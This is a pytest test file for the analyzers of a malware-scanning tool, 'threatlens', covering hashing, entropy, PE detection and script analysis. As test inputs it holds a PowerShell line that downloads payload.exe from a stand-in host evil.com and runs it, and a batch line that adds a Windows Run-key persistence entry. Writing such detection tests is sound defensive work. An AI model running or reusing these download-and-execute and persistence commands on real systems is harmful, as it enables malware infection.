"""Tests for all analyzers."""

import os
import pytest
from threatlens.analyzers import generic_analyzer, pe_analyzer, script_analyzer, office_analyzer


class TestGenericAnalyzer:
    def test_hashes(self, fake_pe):
        r = generic_analyzer.analyze(fake_pe)
        assert len(r.md5) == 32
        assert len(r.sha256) == 64
        assert r.file_size > 0

    def test_pe_detection(self, fake_pe):
        r = generic_analyzer.analyze(fake_pe)
        assert r.detected_type.startswith("PE")

    def test_entropy_range(self, fake_pe):
        r = generic_analyzer.analyze(fake_pe)
        assert 0 <= r.entropy <= 8.0

    def test_stealer_strings(self, stealer_script):
        r = generic_analyzer.analyze(stealer_script)
        assert any("password_theft" in s.get("category", "") for s in r.suspicious_strings)

    def test_clean_file(self, clean_script):
        r = generic_analyzer.analyze(clean_script)
        assert len(r.suspicious_strings) == 0

    def test_urls_extraction(self, tmp_file):
        p = tmp_file(b"visit http://example.com/test and https://evil.com/payload.exe now", suffix=".txt")
        r = generic_analyzer.analyze(p)
        assert len(r.urls) >= 2

    def test_empty_file(self, tmp_file):
        p = tmp_file(b"", suffix=".bin")
        r = generic_analyzer.analyze(p)
        assert r.file_size == 0
        assert r.entropy == 0.0


class TestPEAnalyzer:
    def test_not_pe(self, clean_script):
        r = pe_analyzer.analyze(clean_script)
        assert not r.is_pe

    def test_fake_pe(self, fake_pe):
        r = pe_analyzer.analyze(fake_pe)
        # Might fail to parse (too small) but should not crash
        assert isinstance(r.findings, list)


class TestScriptAnalyzer:
    def test_stealer_detection(self, stealer_script):
        r = script_analyzer.analyze(stealer_script)
        assert r.is_script
        assert len(r.file_access) > 0 or len(r.network_activity) > 0

    def test_clean_script(self, clean_script):
        r = script_analyzer.analyze(clean_script)
        assert r.is_script
        assert len(r.keylogger_patterns) == 0
        assert len(r.exfiltration_patterns) == 0

    def test_batch_persistence(self, tmp_file):
        code = b"@echo off\r\nreg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v test /d test.exe\r\n"
        p = tmp_file(code, suffix=".bat")
        r = script_analyzer.analyze(p)
        assert r.is_script
        assert len(r.persistence_patterns) > 0 or len(r.system_commands) > 0

    def test_non_script(self, fake_pe):
        r = script_analyzer.analyze(fake_pe)
        assert not r.is_script

    def test_powershell(self, tmp_file):
        code = b'Invoke-WebRequest -Uri "http://evil.com/payload.exe" -OutFile "$env:TEMP\\svc.exe"\nStart-Process "$env:TEMP\\svc.exe"\n'
        p = tmp_file(code, suffix=".ps1")
        r = script_analyzer.analyze(p)
        assert r.is_script
        assert r.language == "PowerShell"
        assert len(r.network_activity) > 0
